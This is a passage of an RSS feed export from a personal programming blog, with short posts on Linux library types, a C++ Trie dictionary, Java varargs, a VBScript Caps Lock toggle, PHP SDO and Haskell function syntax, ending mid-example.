0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >file.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.14</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 14: Internet technologies</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The Internet is of course a big phenomena, and Linux is a big part of it. Linux servers are very popular, and</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >you can be a part of this revolution.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Among available technologies, here are the most popular ones:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Java - The Java language is a new and powerful language made to be cross-platform. Since the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Web must be available on all systems, this makes Java a very powerful tool. You can make</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Java applets that will run on the user's system and display information or interact with him.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >JavaScript - This is similar to Java, but in a Web page itself. It is embedded in HTML, to do</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >small functions like rollover scripts, and making text appear on the screen.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >CGI - The CGI protocol is very much in use for servers with some sort of account system, like</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >online shops and search engines. You can make CGI scripts in any language, and make your</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Web server run them on the server.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.15</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 15: Library types</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Two types of libraries exist on most operating systems: shared and static. On Windows, they are .DLL, for</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >dynamically linked library, and .LIB for static library.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >On Linux and most Unix, they are .so and .a files. The shared libraries, the .so files, are loaded at runtime.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The .a files, or static libraries, are loaded at compile time and are no longer required to run the binary</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >program.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you make a program, you must decide if you will link it to a static library or a shared one. You will</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >want a shared library in most cases because standard libraries are available on most systems, and would be</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >too big to include in a binary file.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you have a small library that is not one of the standard ones that you need, then you may decide to include</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >it in your binary program. In that case, simply add it like any other object file in your compilation:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >cc -o program file1.o file2.o library.a</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >&nbsp;</SPAN></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200832521413399/</guid>
    </item>
    <item>
      <title>
<![CDATA[Trie字典树做个命令行小字典]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201098114518241/</link>
      <description>
<![CDATA[用Trie字典树的数据结构，利用Ubuntu自带的words文件，做个小字典<br>首先将/usr/share/dict/words中的所有文件读入内存，并用Trie字典树的方式保存，用户从命令行输入单词前缀，程序定位字典树的位置，并输出所有此前缀的单词<br>注意：不支持特殊字符，所有特殊字符以?显示<br>运行结果：<br>./dict<br>&gt;joker<br>joker<br>joker's<br>jokers<br>&gt;popo<br>popover<br>popover's<br>popovers<br>可以发现原始字典将 &lt;word&gt; &lt;word&gt;'s &lt;word&gt;s三种形式分别存储为三个单词，如果在存储时判别这些情况，这可以节省大量存储空间。<br><br>源代码如下<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;cstring&gt;<br>using namespace std;<br>#define N 600000<br>#define toint(c) (c=='\''?0: c&gt;='a'&amp;&amp;c&lt;='z'?26+c-'a'+1: c&gt;='A'&amp;&amp;c&lt;='Z'?c-'A'+1:53)<br>#define tochar(i) (i==0?'\'':i&lt;=26?'A'+i-1: i&lt;53?i-26+'a'-1:'?')<br><br>typedef struct node{<br>&nbsp;&nbsp;&nbsp; struct node *son[54];<br>&nbsp;&nbsp;&nbsp; bool isword;<br>}node;<br>node pool[N];<br>node *root = &amp;pool[0];&nbsp;&nbsp;&nbsp; //root<br>int nodei=0;<br><br>void add(char *word){//向字典中加入单词<br>&nbsp;&nbsp;&nbsp; node *cur = root;<br>&nbsp;&nbsp;&nbsp; for(char *p=word;*p;p++){<br>&nbsp;&nbsp;&nbsp; if(cur-&gt;son[toint(*p)]==NULL)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur-&gt;son[toint(*p)]=&amp;pool[++nodei];<br>&nbsp;&nbsp;&nbsp; cur = cur-&gt;son[toint(*p)];<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; cur-&gt;isword=true;<br>}<br>char tmp[256];<br>void iter(node *cur,int level){//从第level层为cur处开始，遍历字典，输出所有单词<br>&nbsp;&nbsp;&nbsp; if(cur-&gt;isword){<br>&nbsp;&nbsp;&nbsp; tmp[level]='\0';<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;tmp&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;54;i++){<br>&nbsp;&nbsp;&nbsp; if(cur-&gt;son[i] != NULL){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; tmp[level]=tochar(i);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; iter(cur-&gt;son[i], level+1);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>}<br>node* locate(int level){//定位长度为level，内容为tmp的前缀的位置，不存在则返回NULL<br>&nbsp;&nbsp;&nbsp; node *cur=root;<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;level;i++){<br>&nbsp;&nbsp;&nbsp; cur = cur-&gt;son[toint(tmp[i])];<br>&nbsp;&nbsp;&nbsp; if(cur==NULL)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return cur;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return cur;<br>}<br>ifstream fin("/usr/share/dict/words");<br>int main(){<br>&nbsp;&nbsp;&nbsp; while(fin&gt;&gt;tmp){//读入字典 <br>&nbsp;&nbsp;&nbsp; if(tmp[0]==0) continue;<br>&nbsp;&nbsp;&nbsp; add(tmp);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; printf("&gt;");<br>&nbsp;&nbsp;&nbsp; //iter(root,0); //<br>&nbsp;&nbsp;&nbsp; while(cin&gt;&gt;tmp){//用户输出 <br>&nbsp;&nbsp;&nbsp; node *pos=locate(strlen(tmp));//定位前缀<br>&nbsp;&nbsp;&nbsp; if(pos==NULL)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; printf("No words\n");<br>&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; iter(pos, strlen(tmp));//输出结果<br>&nbsp;&nbsp;&nbsp; printf("&gt;");<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return 0;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201098114518241/</guid>
    </item>
    <item>
      <title>
<![CDATA[Java中的可变参数]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200761144716429/</link>
      <description>
<![CDATA[<P>J2SE5之后才支持的。</P>
<P>import java.text.*;</P>
<P>public class Test<BR>{<BR>&nbsp;public static void main(String args[]){<BR>&nbsp;&nbsp;//{0,number,integer} == {0}<BR>&nbsp;&nbsp;String result = MessageFormat.format(<BR>&nbsp;&nbsp;&nbsp;"{3}:{0,number,integer}{1} ought to be enough for {2}&nbsp; ",<BR>&nbsp;&nbsp;&nbsp;640, "kb", "anybody", "Bill Gates");<BR>&nbsp;&nbsp;prt(result);<BR>&nbsp;&nbsp;prtDogs("Dog1","Dog2","Dog3");<BR>&nbsp;}<BR>&nbsp;public static void prtDogs(String ...dogs){<BR>&nbsp;&nbsp;prt("I have " + dogs.length + " dogs");<BR>&nbsp;&nbsp;for(String dog:dogs){<BR>&nbsp;&nbsp;&nbsp;prt(dog);<BR>&nbsp;&nbsp;}<BR>&nbsp;}<BR>&nbsp;public static void prt(String s){<BR>&nbsp;&nbsp;System.out.println(s);<BR>&nbsp;}<BR>}</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200761144716429/</guid>
    </item>
    <item>
      <title>
<![CDATA[vbs控制大写锁定灯]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720102266585651/</link>
      <description>
<![CDATA[set WshShell = CreateObject("WScript.Shell")<br>WshShell.SendKeys "{CAPSLOCK}"]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>JavaScript</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720102266585651/</guid>
    </item>
    <item>
      <title>
<![CDATA[在php中使用SDO]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720084222121347/</link>
      <description>
<![CDATA[<img src="http://devzone.zend.com/images/sdo_images/sdo_model.jpg"><br>SDO是一个很古老的程序写法，就是把类的所有属性都抽象成名值对<br>一个来自IBMDW的例子：<br>&lt;?php<br>header('Content-type: application/xml');<br><br>/* Construct an XML DAS using the schema for RSS */<br>$rss_xmldas&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = SDO_DAS_XML::create('./rss.xsd');<br><br>/* Load an XML file that contains a few settings */<br>$rss_document&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = $rss_xmldas-&gt;loadFile('./base.xml');<br>$rss_data_object&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = $rss_document-&gt;getRootDataObject();<br><br>/* Set build and publish date on the channel */<br>$channel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = $rss_data_object-&gt;channel;<br>$channel-&gt;lastBuildDate = date("D\, j M Y G:i:s T");<br>$channel-&gt;pubDate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = date("D\, j M Y G:i:s T");<br><br>/* Open and load the blog, using a second XML DAS */&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>$blog_xmldas&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = SDO_DAS_XML::create('./blog.xsd');<br>$blog_document&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = $blog_xmldas-&gt;loadFile('./blog.xml');<br>$blog_data_object&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = $blog_document-&gt;getRootDataObject();<br><br>//var_dump($blog_data_object);<br><br>/* iterate through the items in the blog and for each one<br>&nbsp;&nbsp; create a corresponding item in the rss feed */<br>foreach ($blog_data_object-&gt;item as $item) { <br>&nbsp;&nbsp;&nbsp; $new_channel_item&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = $channel-&gt;createDataObject('item');<br><br>&nbsp;&nbsp;&nbsp; $new_channel_item-&gt;title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = $item-&gt;title;<br>&nbsp;&nbsp;&nbsp; $new_channel_item-&gt;description = $item-&gt;description;<br>&nbsp;&nbsp;&nbsp; $new_channel_item-&gt;pubDate&nbsp;&nbsp;&nbsp;&nbsp; = $item-&gt;date;<br>&nbsp;&nbsp;&nbsp; $new_channel_item-&gt;link&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = "http://localhost/rss/showitem.php?id=" . $item-&gt;guid;<br><br>&nbsp;&nbsp;&nbsp; $guid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = $new_channel_item-&gt;createDataObject('guid');<br>&nbsp;&nbsp;&nbsp; $guid-&gt;value&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = md5($new_channel_item-&gt;pubDate);<br>&nbsp;&nbsp;&nbsp; $guid-&gt;isPermaLink&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = false;<br>}<br><br>print $rss_xmldas-&gt;saveString($rss_document,2);<br>?&gt; <br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720084222121347/</guid>
    </item>
    <item>
      <title>
<![CDATA[Haskell的函数]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010111310156349/</link>
      <description>
<![CDATA[崩溃啊，写了几千字，笔记本崩溃重启，全丢了！！！重新写<br>Haskell是一门函数编程语言，函数也是Haskell的核心部分。和C/C++一样，Haskell的函数也包括函数声明和函数定义两部分。C/C++的函数声明主要指定函数的参数和返回值的类型，函数实现定义函数的功能与实现方法。Haskell中也是这样的。一个Haskell的例子如下：<br>一个最简单的 add，首先编写一个add.hs脚本，然后加载(:l add)，调用(add 3 4)<br>$ cat&gt;add.hs&lt;&lt;EOF<br>add :: (Num a) =&gt; a-&gt;a-&gt;a<br>add x y = x+y<br>EOF<br>$ ghci<br>Prelude&gt; l add<br>Prelude&gt; add 3 4<br>7<br>Prelude&gt; add 3 4.2<br>7.2<br><br><b>函数声明</b><br>在add.hs的例子中，函数声明部分是add::(Num a) =&gt; a-&gt;a-&gt;a<br>::是一个分割符，左边是函数名，右边是函数类型定义，关于函数类型参看＜<a href="http://hankjin.blog.163.com/blog/static/337319372010111372444396/" target="_blank">Haskell的数据类型</a>＞<br>=&gt;是分割符，左边是一些类型声明，(Num a)表示后面的a表示Num类型类；右边是参数和返回值的类型，用-&gt;符号分开，a-&gt;a-&gt;a的前两个a表示函数参数类型，第三个a是函数返回值类型，都是数值型。<br>此外，有时=&gt;可以省略，例如：<br>isUpper :: Char -&gt; Bool<br>isUpper x= x `elem` ['A'..'Z']<br><b>函数定义</b><br>在add.hs的例子中，函数定义部分是add x y = x+y<br>=号左边是函数名称和函数参数：add是函数名，x和y分别是第1和第2个参数。<br>=号右边是函数的实现：x+y表示函数的结果就是两个参数相加的结果。<br><b>函数语法</b><br>每种程序设计语言都有顺序，分支，循环语句相应的语法，Haskell也不例外。Haskell的函数语法主要有以下几种：<br><b>1。模式匹配</b><br>编译C/C++程序时，函数重定义是一个见的错误，但是在Haskell语言中，这种“错误”是一种常见的语法。<br>例如定义星期几的函数：<br>$ cat &gt; week.hs&lt;&lt;EOF<br>week :: (Integral i) =&gt; i -&gt; String<br>week 1="Monday"<br>week 2="Tuesday"<br>week 3="Wednesday"<br>week 4="Thursday"<br>week 5="Friday"<br>week 6="Saturday"<br>week 7="Sunday"<br>week x="Invalid day"<br>EOF<br>$ ghci<br>Prelude &gt; :l week<br>Prelude &gt; week 2<br>"Tuesday"<br>这个函数在执行的时候，按照函数定义的顺序依次对参数进行模式匹配，遇到匹配的就返回相应的函数值。<br>_符号在Haskell中有通配符的意思，例如fst的实现，就是取Tuple的第一个元素，第二个元素就不必关心，因此在函数定义中就用_来表示。<br>fst' (a,_)=a<br>:符号在List相关的函数定义中有重要的作用，例如sum，我们实现一个自己的sum<br>sum :: (Integral i) =&gt; [i] -&gt; i<br>sum' []=0<br>sum' (x:xs)=x+sum'(xs)<br><b>2。岗哨<br></b>除了模式匹配外，还有一个岗哨的方式，在模式比较多的时候，可读性会更好一些：<br>week :: (Integral i) =&gt; i -&gt; String<br>week x<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |x==1 ="Monday"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |x==2 ="Tuesday"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |x==3 ="Wednesday"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |x==4 ="Thursday"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |x==5 ="Friday"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |x==6 ="Saturday"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |x==7 ="Sunday"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |otherwise ="Invalid day"<br>模式匹配的方式比较直观简单，但是重复太多，对离散度很高的情况尚且可以，但对分段函数就有些无能为力了，例如个人所得税的计算，用岗哨的方式就比较方便。如果用模式匹配就很麻烦了。<br>tax :: (RealFloat n) =&gt; n-&gt;n<br>tax x<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=2000 = 0 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=2500 = (x-2000)*0.05<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=4000 = (x-2000)*0.10-25<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=7000 = (x-2000)*0.15-125<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=22000 = (x-2000)*0.20-375<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=42000 = (x-2000)*0.25-1375<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=62000 = (x-2000)*0.30-3375<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=82000 = (x-2000)*0.35-6375<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=102000 = (x-2000)*0.4-10375<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | otherwise = (x-2000)*0.45-15375<br><b>3。where</b><br>个人所得税的描述中，都是从2000起开始计算的，上面的代码中也多次用到了x-2000这个中间变量，如果有一个中间变量来表示x-2000，代码就是优雅许多，如下所示：<br>tax :: (RealFloat n) =&gt; n-&gt;n<br>tax v<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=0 = 0 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=500 = x*0.05<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=2000 = x*0.10-25<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=5000 = x*0.15-125<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=20000 = x*0.20-375<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=40000 = x*0.25-1375<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=60000 = x*0.30-3375<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=80000 = x*0.35-6375<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | x&lt;=100000 = x*0.4-10375<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | otherwise = x*0.45-15375<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; where x=v-2000<br>这里用where x=v-2000声明了一个中间变量，使得代码比前面单纯用岗哨的方法优雅了许多，而且可读性也好了很多，可以很方便地对照个人所得税的表格。<br><b>4。let..[in]..</b><br>let...in...和where有些像，也是一种声明局部中间变量的方法。<br>除些之外，let还可以声明非局部变量。例如 let x=4，在后面的语句中，x仍然有效。<br><b>5。case</b><br>case的语法为：注意各个pattern要对齐。<br>case &lt;expression&gt; of &lt;pattern1&gt; -&gt; &lt;result1&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;pattern2&gt; -&gt; &lt;result2&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;pattern3&gt; -&gt; &lt;result3&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;patterni&gt; -&gt; &lt;resulti&gt;<br>case一般用在表达式的中间，有些匿名函数的感觉。例如下面这个例子，case就是用来生成字符串的一部分：<br>test :: (Integral i) =&gt; i -&gt; String<br>test week="Today is " ++ case week of 4 -&gt; 